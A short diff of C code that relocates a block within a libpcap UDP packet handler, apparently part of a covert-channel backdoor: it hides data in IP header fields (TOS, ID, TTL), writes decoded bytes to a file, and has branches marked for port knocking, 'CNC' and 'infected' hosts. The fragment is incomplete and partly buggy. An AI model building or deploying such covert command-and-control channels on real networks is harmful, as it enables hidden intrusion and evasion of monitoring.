@@ -83,21 +83,6 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         printf("IPID: %hu\n", ip->ip_id);
         printf("TOS: %u\n", ip->ip_tos);
         printf("TTL: %u\n\n", ip->ip_ttl);
-        if(CheckKey(ip->ip_tos, ip->ip_id, false, false)){
-            //normal packet
-            FILE *file;
-            if((file = fopen(FILENAME, "wb+")) < 0){
-                perror("fopen");
-                exit(1);
-            }
-            printf("Output: %c\n", ip->ip_ttl);
-            fprintf(file, "%c", ip->ip_ttl);
-            fflush(file);
-            fclose(file);
-        } else if(CheckKey(ip->ip_tos, ip->ip_id, true, false)){
-            //port knocking packet
-
-        }
         if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'r' && Filter->infected == false){
             //CNC
             //close loop end of results
@@ -114,6 +99,21 @@ void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         } else if(ip->ip_id == 'x' && ip->ip_tos == 'x' && ip->ip_ttl == 'c' && Filter->infected == true){
             //infected
     }
+        if(CheckKey(ip->ip_tos, ip->ip_id, false, false)){
+            //normal packet
+            FILE *file;
+            if((file = fopen(FILENAME, "wb+")) < 0){
+                perror("fopen");
+                exit(1);
+            }
+            printf("Output: %c\n", ip->ip_ttl);
+            fprintf(file, "%c", ip->ip_ttl);
+            fflush(file);
+            fclose(file);
+        } else if(CheckKey(ip->ip_tos, ip->ip_id, true, false)){
+            //port knocking packet
+
+        }
     }
 
 }
